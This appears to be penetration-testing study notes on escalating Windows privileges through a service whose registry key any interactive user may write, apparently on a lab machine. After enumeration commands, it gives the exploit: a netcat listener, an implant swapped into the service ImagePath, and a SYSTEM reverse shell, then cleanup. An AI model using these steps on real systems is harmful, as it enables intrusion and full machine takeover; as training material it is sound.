# Living off the Land

Sometimes windows services that contains a registry value that was configured poorly using approved applications that can be escalated by attackers to re-configure the registry path of the binary.

## 01 - Detect

### 1.1 - Command Prompt

TODO: Rewrite from command prompt to powershell

```
C:\> wmic.exe service get name,startname,pathname where pathname like 'LocalSystem' | findstr /i "c:\program files"
regsvc                                    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"           LocalSystem

C:\> sc.exe qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Nothing out of the ordinary when trying to enumerate the binary that cannot be overwritten.

```
C:\> icacls "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
C:\Program Files\Insecure Registry Service\insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                       BUILTIN\Administrators:(I)(F)
                                                                       BUILTIN\Users:(I)(RX)
                                                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We use can the `reg.exe` command to query of a certain path of what we can override by the following registry values. The path for the registries that is related to Windows Services is `hklm\system\currentcontrolset\services` or `hkey_local_machine\system\currentcontrolset\services`

```
C:\> reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\RegSvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem
```

When using `accesschk.exe` we can confirm that it is possible to override the registry configuration path file.

```
C:\> accesschk.exe -uvwqk HKLM\SYSTEM\CurrentControlSet\Services\RegSvc
HKLM\system\currentcontrolset\services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```

### 1.2 - Powershell

Nothing out of the ordinary when trying to enumerate the binary that cannot be overwritten.

```
PS C:\> get-acl "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" | format-list


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Insecure Registry Service\insecureregistryservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0  
         x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)

PS C:\> $acl = get-acl -path "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)                       
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)                    
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

The other method to query using a powershell cmdlet **Get-ItemProperty** can be possible to enumerate.

```
PS C:\> get-itemproperty -path registry::hklm\system\currentcontrolset\services\regsvc


Type         : 16
Start        : 3
ErrorControl : 1
ImagePath    : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
DisplayName  : Insecure Registry Service
ObjectName   : LocalSystem
PSPath       : Microsoft.PowerShell.Core\Registry::hklm\system\currentcontrolset\services\regsvc
PSParentPath : Microsoft.PowerShell.Core\Registry::hklm\system\currentcontrolset\services
PSChildName  : regsvc
PSProvider   : Microsoft.PowerShell.Core\Registry


PS C:\> get-acl -path hklm:\system\currentcontrolset\services\regsvc | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)


PS C:\> $acl = get-acl -path hklm:\system\currentcontrolset\services\regsvc | format-list
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
Everyone: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\INTERACTIVE: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
```

```
PS C:\> Get-ACL hklm:\system\currentcontrolset\services\regsvc | Format-List AccessToString
```

## 02 - Exploit

```
$ sudo nc -lnvp 53
```

- In command prompt

```
C:\> copy implant.exe c:\temp\registry-query.exe

C:\> reg add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d c:\temp\registry-query.exe /f

C:\> net start regsvc
```

- In powershell

```
PS C:\> copy-item implant.exe c:\temp\registry-query.exe

PS C:\> set-itemproperty -force -path hklm:\system\currentcontrolset\services\regsvc -name imagepath -type expandstring -value c:\temp\registry-query.exe

PS C:\> start-service regsvc
```

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.186.48.
Ncat: Connection from 10.10.186.48:49914.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## 03 - Cleanup

Now we have to revert back the modifications we've made by using the same command.

- In command prompt

```
C:\Windows\system32> reg add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" /f
```

- In powershell

```
PS C:\Windows\system32> set-itemproperty -force -path hklm:\system\currentcontrolset\services\regsvc -name imagepath -type expandstring -value "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```

---
## References

- [Hacking Articles: Windows Privilege Escalation Weak Registry Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/)

- [r3d buck3t: Abuse Service Registry ACLs Windows Privesc](https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509)